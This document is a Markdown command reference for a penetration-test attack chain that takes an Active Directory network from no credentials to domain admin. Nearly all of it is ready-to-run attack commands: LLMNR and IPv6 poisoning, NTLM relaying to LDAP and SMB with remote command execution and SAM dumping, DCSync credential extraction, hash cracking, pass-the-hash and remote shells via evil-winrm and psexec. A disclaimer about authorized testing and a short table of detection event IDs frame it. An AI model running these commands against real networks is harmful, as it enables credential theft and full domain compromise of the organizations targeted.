# Attack Chain Command Reference

Quick reference for all commands used in the "Zero Creds to Enterprise Admin" attack chain.

> **Warning:** These commands are for authorized penetration testing only. Ensure you have explicit written permission before using these techniques.

---

## Phase 1: Reconnaissance

### Network Scanning
```bash
# Full TCP port scan
sudo nmap -sS -sV -p- --min-rate 10000 -oA full_scan <target_range>

# UDP scan (top 200 ports)
sudo nmap -sU -sV --top-ports 200 -oA udp_scan <target_range>

# Identify live hosts
sudo nmap -sn <target_range> -oA alive_hosts
```

### SMB Enumeration
```bash
# Generate relay target list (hosts with SMB signing disabled)
nxc smb <target_range> --gen-relay-list smb_targets.txt

# Enumerate shares
nxc smb <target_range> -u '' -p '' --shares

# Enumerate users (null session)
nxc smb <target_range> -u '' -p '' --users
```

---

## Phase 2: Network Poisoning

### Responder (LLMNR/NBT-NS Poisoning)
```bash
# Start Responder (capture mode)
sudo responder -I eth0 -wd

# Responder with all servers enabled
sudo responder -I eth0 -wrf

# Analyze captured hashes
cat /usr/share/responder/logs/Responder-Session.log
```

### MITM6 (IPv6 DNS Poisoning)
```bash
# Basic MITM6
sudo mitm6 -d <domain>

# Target specific hosts
sudo mitm6 -d <domain> -hw <hostname>

# With debug output
sudo mitm6 -d <domain> -v
```

---

## Phase 3: NTLM Relay

### ntlmrelayx - LDAP Relay
```bash
# Relay to LDAP with delegate access (creates machine accounts)
sudo impacket-ntlmrelayx \
  -t ldap://<dc_ip>:389 \
  --delegate-access \
  --no-smb-server

# Relay to LDAPS
sudo impacket-ntlmrelayx \
  -t ldaps://<dc_ip>:636 \
  --delegate-access \
  --no-smb-server

# Escalate privileges via ACL abuse
sudo impacket-ntlmrelayx \
  -t ldap://<dc_ip>:389 \
  --escalate-user <username>
```

### ntlmrelayx - SMB Relay
```bash
# Relay to SMB targets from file
sudo impacket-ntlmrelayx \
  -tf smb_targets.txt \
  -smb2support

# Execute command on relay
sudo impacket-ntlmrelayx \
  -tf smb_targets.txt \
  -c "whoami > C:\relay_test.txt"

# Dump SAM database
sudo impacket-ntlmrelayx \
  -tf smb_targets.txt \
  --sam
```

---

## Phase 4: Credential Extraction

### DCSync Attack
```bash
# DCSync all credentials
impacket-secretsdump \
  -dc-ip <dc_ip> \
  -just-dc \
  '<domain>/<username>:<password>@<dc_ip>'

# DCSync with hash (pass-the-hash)
impacket-secretsdump \
  -dc-ip <dc_ip> \
  -just-dc \
  -hashes :<nt_hash> \
  '<domain>/<username>@<dc_ip>'

# DCSync specific user
impacket-secretsdump \
  -dc-ip <dc_ip> \
  -just-dc-user <target_user> \
  '<domain>/<username>:<password>@<dc_ip>'
```

### Hash Cracking
```bash
# Crack NTLMv2 with hashcat
hashcat -m 5600 hashes.txt wordlist.txt

# Crack NTLM (NT hash) with hashcat
hashcat -m 1000 hashes.txt wordlist.txt

# John the Ripper
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
```

---

## Phase 5: Post-Exploitation

### Evil-WinRM (Remote Access)
```bash
# Password authentication
evil-winrm -i <target_ip> -u '<username>' -p '<password>'

# Pass-the-hash
evil-winrm -i <target_ip> -u '<username>' -H '<nt_hash>'

# With SSL
evil-winrm -i <target_ip> -u '<username>' -p '<password>' -S
```

### Remote Command Execution
```bash
# PSExec
impacket-psexec '<domain>/<username>:<password>@<target_ip>'

# WMIExec (stealthier)
impacket-wmiexec '<domain>/<username>:<password>@<target_ip>'

# SMBExec
impacket-smbexec '<domain>/<username>:<password>@<target_ip>'
```

### Domain Enumeration
```bash
# Check Machine Account Quota
nxc ldap <dc_ip> -u '<user>' -p '<pass>' -d <domain> -M maq

# Enumerate domain users
nxc ldap <dc_ip> -u '<user>' -p '<pass>' -d <domain> --users

# Enumerate domain groups
nxc ldap <dc_ip> -u '<user>' -p '<pass>' -d <domain> --groups

# Check for ADCS (Certificate Services)
nxc ldap <dc_ip> -u '<user>' -p '<pass>' -d <domain> -M adcs
```

---

## Useful One-Liners

```bash
# Quick check for SMB signing
nxc smb <target> | grep signing

# Find Domain Controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

# Test credentials
nxc smb <dc_ip> -u '<user>' -p '<pass>' -d <domain>

# Pass-the-hash test
nxc smb <dc_ip> -u '<user>' -H '<nt_hash>' -d <domain>
```

---

## Environment Variables

```bash
# Set target domain
export DOMAIN="corp.local"
export DC_IP="192.168.0.206"

# Use in commands
nxc smb $DC_IP -u 'user' -p 'pass' -d $DOMAIN
```

---

## Detection Evasion Notes

These techniques may trigger the following detections:

| Technique | Event IDs to Monitor |
|-----------|---------------------|
| NTLM Relay | 4624 (Type 3 logon) |
| DCSync | 4662 (Replication) |
| Machine Account Creation | 4741 |
| Group Membership Change | 4728, 4732, 4756 |
| Pass-the-Hash | 4624 (Type 9) |

---

*For authorized security testing only.*
